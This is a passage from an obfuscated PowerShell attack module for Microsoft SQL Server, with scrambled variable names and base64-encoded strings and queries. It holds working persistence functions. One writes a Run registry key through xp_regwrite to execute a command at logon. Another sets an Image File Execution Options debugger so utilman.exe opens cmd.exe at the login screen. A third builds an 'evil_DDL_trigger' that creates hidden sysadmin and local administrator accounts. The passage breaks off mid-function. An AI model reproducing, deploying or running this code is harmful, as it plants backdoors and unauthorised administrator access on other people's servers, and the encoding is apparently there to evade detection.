        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Name of the registry value.')]
        [string]$Name = "Hacker",
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The command to run.')]
        [string]$Command = 'PowerShell.exe -C "Write-Host hacker | Out-File C:\temp\iamahacker.txt"',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }       
        ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        ${/=====\__/\/=\_/\} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if(${/=====\__/\/=\_/\})
        {
            ${_/\/=\/=\_______/} = ${/=====\__/\/=\_/\}.Split('.')[0]
        }
        if(${__/\/==\____/\_/=} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {          
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGkAcwAgAGYAdQBuAGMAdABpAG8AbgAgAHIAZQBxAHUAaQByAGUAcwAgAHMAeQBzAGEAZABtAGkAbgAgAHAAcgBpAHYAaQBsAGUAZwBlAHMALgAgAEQAbwBuAGUALgA=')))
            Return
        }else{
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHcAcgBpAHQAZQAgAHYAYQBsAHUAZQA6ACAAJABuAGEAbQBlAA==')))
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHcAcgBpAHQAZQAgAGMAbwBtAG0AYQBuAGQAOgAgACQAYwBvAG0AbQBhAG4AZAA=')))
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABVAHMAZQAgAHgAcABfAHIAZQBnAHcAcgBpAHQAZQAgAHQAbwAgAGMAbwBuAGYAaQBnAHUAcgBlACAADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABhACAAZgBpAGwAZQAgAHQAbwAgAGUAeABlAGMAdQB0AGUAIABzAGEAIABjAG8AbQBtAGEAbgBkACAAdwBoAGUAbgAgAHUAcwBlAHIAcwAgAGwADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABsAG8AZwAgAGkAbgB0AG8AIAB0AGgAZQAgAHMAeQBzAHQAZQBtAA0ACgAgACAAIAAgACAAIAAgACAALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAIABtAGEAcwB0AGUAcgAuAC4AeABwAF8AcgBlAGcAdwByAGkAdABlAA0ACgAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5ACAAIAAgACAAIAA9ACAAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5ACAAIAAgACAAIAAgACAAIAAgAD0AIAAnAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFIAdQBuACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAgACAAPQAgACcAJABOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdAB5AHAAZQAgACAAIAAgACAAIAAgACAAPQAgACcAUgBFAEcAXwBTAFoAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAIAAgACAAIAAgACAAIAA9ACAAJwAkAEMAbwBtAG0AYQBuAGQAJwA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${__/======\_/=\_/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABXAGkAbgBkAG8AdwBzACAAQQB1AHQAbwAgAEwAbwBnAGkAbgAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAFIAZQBnAGkAcwB0AHIAeQANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAEEAdQB0AG8ATABvAGcAaQBuACAARABlAGYAYQB1AGwAdAAgAEQAbwBtAGEAaQBuAA0ACgAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAgAEAAQwBoAGUAYwBrAFYAYQBsAHUAZQAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnACQATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABDAGgAZQBjAGsAVgBhAGwAdQBlACAAbwB1AHQAcAB1AHQADQAKACAAIAAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAgAEQAaQBzAHAAbABhAHkAIABSAGUAcwB1AGwAdABzAA0ACgAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIABDAGgAZQBjAGsAVgBhAGwAdQBlACAAPQAgAEAAQwBoAGUAYwBrAFYAYQBsAHUAZQA=')))
        ${___/==\/\/\/=\___} = Get-SQLQuery -Instance $Instance -Query ${__/======\_/=\_/=} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
        ${_/==\/\/\/\/\___/} = ${___/==\/\/\/=\___}.CheckValue   
        if(${_/==\/\/\/\/\___/}.length -ge 2){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAGcAaQBzAHQAcgB5ACAAZQBuAHQAcgB5ACAAdwByAGkAdAB0AGUAbgAuAA==')))                   
        }else{
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARgBhAGkAbAAgAHQAbwAgAHcAcgBpAHQAZQAgAHQAbwAgAHIAZQBnAGkAcwB0AHIAeQAgAGQAdQBlACAAdABvACAAaQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
        } 
    }
    End
    {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABvAG4AZQAuAA==')))
    }
}
Function   Get-SQLPersistRegDebugger
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Name of the registry value.')]
        [string]$FileName= "utilman.exe",
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The command to run.')]
        [string]$Command = 'c:\windows\system32\cmd.exe',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }       
        ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        ${/=====\__/\/=\_/\} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if(${/=====\__/\/=\_/\})
        {
            ${_/\/=\/=\_______/} = ${/=====\__/\/=\_/\}.Split('.')[0]
        }
        if(${__/\/==\____/\_/=} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {          
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGkAcwAgAGYAdQBuAGMAdABpAG8AbgAgAHIAZQBxAHUAaQByAGUAcwAgAHMAeQBzAGEAZABtAGkAbgAgAHAAcgBpAHYAaQBsAGUAZwBlAHMALgAgAEQAbwBuAGUALgA=')))
            Return
        }else{
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHcAcgBpAHQAZQAgAGQAZQBiAHUAZwBnAGUAcgA6ACAAJABGAGkAbABlAE4AYQBtAGUA')))
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHcAcgBpAHQAZQAgAGMAbwBtAG0AYQBuAGQAOgAgACQAQwBvAG0AbQBhAG4AZAA=')))
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAALQAtAC0AIABUAGgAaQBzACAAdwBpAGwAbAAgAGMAcgBlAGEAdABlACAAYQAgAHIAZQBnAGkAcwB0AHIAeQAgAGsAZQB5ACAAdABoAHIAbwB1AGcAaAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIAAoAGEAcwAgAHMAeQBzAGEAZABtAGkAbgApAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAAdABvACAAcgB1AG4AIABhACAAZABlAGYAaQBuAGUAZAAgAGQAZQBiAHUAZwBnAGUAcgAgACgAYQBuAHkAIABjAG8AbQBtAGEAbgBkACkAIABpAG4AcwB0AGUAYQBkACAAbwBmACAAaQBuAHQAZQBuAGQAZQBkACAAYwBvAG0AbQBhAG4AZAANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAgAGkAbgAgAHQAaABlACAAZQB4AGEAbQBwAGwAZQAgAHUAdABpAGwAbQBhAG4ALgBlAHgAZQAgAGMAYQBuACAAYgBlACAAcgBlAHAAbABhAGMAZQAgAHcAaQB0AGgAIABjAG0AZAAuAGUAeABlACAAYQBuAGQAIABlAHgAZQBjAHUAdABlAGQAIABvAG4AIABkAGUAbQBhAG4AZAAgAHYAaQBhACAAcgBkAHAADQAKACAAIAAgACAAIAAgACAAIAAtAC0ALQAgAG4AbwB0AGUAOgAgAHQAaABpAHMAIABjAG8AdQBsAGQAIABlAGEAcwBpAGwAeQAgAGIAZQAgAGEAIABlAG0AcABpAHIAZQAvAG8AdABoAGUAcgAgAHAAYQB5AGwAbwBhAGQADQAKACAAIAAgACAAIAAgACAAIABFAFgARQBDACAAbQBhAHMAdABlAHIALgAuAHgAcABfAHIAZQBnAHcAcgBpAHQAZQANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAgACAAIAAgACAAPQAgACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQABrAGUAeQAgACAAIAAgACAAIAAgACAAIAA9ACAAJwBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABJAG0AYQBnAGUAIABGAGkAbABlACAARQB4AGUAYwB1AHQAaQBvAG4AIABPAHAAdABpAG8AbgBzAFwAJABGAGkAbABlAE4AYQBtAGUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlACAAIAA9ACAAJwBEAGUAYgB1AGcAZwBlAHIAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB0AHkAcABlACAAIAAgACAAIAAgACAAIAA9ACAAJwBSAEUARwBfAFMAWgAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAgACAAIAAgACAAIAAgAD0AIAAnACQAQwBvAG0AbQBhAG4AZAAnAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${__/======\_/=\_/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABXAGkAbgBkAG8AdwBzACAAQQB1AHQAbwAgAEwAbwBnAGkAbgAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAFIAZQBnAGkAcwB0AHIAeQANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAEEAdQB0AG8ATABvAGcAaQBuACAARABlAGYAYQB1AGwAdAAgAEQAbwBtAGEAaQBuAA0ACgAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAgAEAAQwBoAGUAYwBrAFYAYQBsAHUAZQAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBtAGEAZwBlACAARgBpAGwAZQAgAEUAeABlAGMAdQB0AGkAbwBuACAATwBwAHQAaQBvAG4AcwBcACQARgBpAGwAZQBOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAJAAkAPQAgAE4AJwBEAGUAYgB1AGcAZwBlAHIAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUACQAJAAkAPQAgAEAAQwBoAGUAYwBrAFYAYQBsAHUAZQAgAG8AdQB0AHAAdQB0AA0ACgAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABEAGkAcwBwAGwAYQB5ACAAUgBlAHMAdQBsAHQAcwANAAoAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAQwBoAGUAYwBrAFYAYQBsAHUAZQAgAD0AIABAAEMAaABlAGMAawBWAGEAbAB1AGUA')))
        ${___/==\/\/\/=\___} = Get-SQLQuery -Instance $Instance -Query ${__/======\_/=\_/=} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
        ${_/==\/\/\/\/\___/} = ${___/==\/\/\/=\___}.CheckValue   
        if(${_/==\/\/\/\/\___/}.length -ge 2){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAGcAaQBzAHQAcgB5ACAAZQBuAHQAcgB5ACAAdwByAGkAdAB0AGUAbgAuAA==')))                   
        }else{
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARgBhAGkAbAAgAHQAbwAgAHcAcgBpAHQAZQAgAHQAbwAgAHIAZQBnAGkAcwB0AHIAeQAgAGQAdQBlACAAdABvACAAaQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
        } 
    }
    End
    {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABvAG4AZQAuAA==')))
    }
}
Function Get-SQLPersistTriggerDDL
{
  [CmdletBinding()]
  Param(
    [Parameter(Mandatory = $false,
    HelpMessage = 'Username to authenticate with.')]
    [string]$Username,
    [Parameter(Mandatory = $false,
    HelpMessage = 'Password to authenticate with.')]
    [string]$Password,
    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new SQL Server sysadmin login.')]
    [string]$NewSqlUser,
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new SQL Server sysadmin login.')]
    [string]$NewSqlPass,
    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new Windows local administrator account.')]
    [string]$NewOsUser,
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new Windows local administrator account.')]
    [string]$NewOsPass,
    [Parameter(Mandatory=$false,
    HelpMessage='Create trigger that will run the provide PowerShell command.')]
    [string]$PsCommand,
    [Parameter(Mandatory = $false,
    ValueFromPipelineByPropertyName = $true,
    HelpMessage = 'SQL Server instance to connection to.')]
    [string]$Instance,
    [Parameter(Mandatory=$false,
    HelpMessage='This will remove the trigger named evil_DDL_trigger create by this script.')]
    [Switch]$Remove
  )
    ${__/==\/==\____/\_} = New-Object System.Data.SqlClient.SqlConnection
    if($Username){
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAdABvACAAJABJAG4AcwB0AGEAbgBjAGUAIAB3AGkAdABoACAAUwBRAEwAIABsAG8AZwBpAG4AIAAkAFUAcwBlAHIAbgBhAG0AZQAuAC4ALgA=')))
        ${__/==\/==\____/\_}.ConnectionString = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAPQAkAEkAbgBzAHQAYQBuAGMAZQA7AEQAYQB0AGEAYgBhAHMAZQA9AG0AYQBzAHQAZQByADsAVQBzAGUAcgAgAEkARAA9ACQAVQBzAGUAcgBuAGEAbQBlADsAUABhAHMAcwB3AG8AcgBkAD0AJABQAGEAcwBzAHcAbwByAGQAOwA=')))
        [string]${/=====\___/\/\/=\} = $Username
    }else{
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAdABvACAAJABJAG4AcwB0AGEAbgBjAGUAIABhAHMAIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIABXAGkAbgBkAG8AdwBzACAAdQBzAGUAcgAuAC4ALgA=')))
        ${__/==\/==\____/\_}.ConnectionString = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAPQAkAEkAbgBzAHQAYQBuAGMAZQA7AEQAYQB0AGEAYgBhAHMAZQA9AG0AYQBzAHQAZQByADsASQBuAHQAZQBnAHIAYQB0AGUAZAAgAFMAZQBjAHUAcgBpAHQAeQA9AFMAUwBQAEkAOwA=')))   
        ${/=\/=\/\/==\_/===} = [Environment]::UserDomainName
        ${_________/==\/\/=} = [Environment]::UserName
        ${/=====\___/\/\/=\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQBcAC8AXAAvAD0APQBcAF8ALwA9AD0APQB9AFwAJAB7AF8AXwBfAF8AXwBfAF8AXwBfAC8APQA9AFwALwBcAC8APQB9AA==')))                    
     }
    try{
        ${__/==\/==\____/\_}.Open()
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABlAGQALgA='))) 
        ${__/==\/==\____/\_}.Close()
    }catch{
        ${/=\_______/===\__} = $_.Exception.Message
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAGYAYQBpAGwAZQBkAA=='))) 
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQByAHIAbwByADoAIAAkAHsALwA9AFwAXwBfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAH0A')))  
        Break
    }
    ${__/==\/==\____/\_}.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIABpAHMAXwBzAHIAdgByAG8AbABlAG0AZQBtAGIAZQByACgAJwBzAHkAcwBhAGQAbQBpAG4AJwApACAAYQBzACAAcwB5AHMAcwB0AGEAdAB1AHMA')))
    ${___/=\/\__/\__/\_} = New-Object System.Data.SqlClient.SqlCommand($Query,${__/==\/==\____/\_})
    ${__/\/=\/=\/\/\_/\} = ${___/=\/\__/\__/\_}.ExecuteReader() 
    ${/==\___/\___/\/\_} = New-Object System.Data.DataTable
    ${/==\___/\___/\/\_}.Load(${__/\/=\/=\/\/\_/\})  
    ${/==\___/\___/\/\_} | select -First 1 sysstatus | foreach {
        ${/==\/\_/\/=\/\__/} = $_.sysstatus
        if (${/==\/\_/\/=\/\__/} -ne 0){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AZgBpAHIAbQBlAGQAIABTAHkAcwBhAGQAbQBpAG4AIABhAGMAYwBlAHMAcwAuAA==')))                             
        }else{
